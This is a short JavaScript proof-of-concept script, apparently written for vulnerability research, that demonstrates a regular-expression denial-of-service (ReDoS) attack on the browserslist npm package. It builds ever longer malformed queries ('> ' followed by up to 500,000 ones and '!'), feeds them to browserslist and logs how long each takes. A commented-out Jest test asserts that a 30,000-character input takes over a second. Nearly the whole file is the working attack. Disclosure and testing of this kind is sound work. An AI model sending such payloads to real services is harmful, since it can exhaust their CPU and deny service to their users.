function build_attack(n) {
    var ret = "> "
    for (var i = 0; i < n; i++) {
        ret += "1"
    }
    return ret + "!";
}
const browserslist = require("browserslist")
// browserslist('> 1%')

//browserslist(build_attack(500000))
for(var i = 1; i <= 500000; i++) {
    if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
        
        browserslist(attack_str);
        var time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
            
    }
}

// test("ReDos in browserslist", () => {

//     const genstr = require("./utils").genstr;
//     const measureTime = require("./utils").measureTime;
//     const browserslist = require("browserslist")

//     let attack_str = build_attack(30000);
    
//     let t = measureTime(function () {
//         browserslist(attack_str);
//     });

//     let time= t[0]+t[1]/1000000000;
    
//     expect(time).toBeGreaterThan(1);
//     });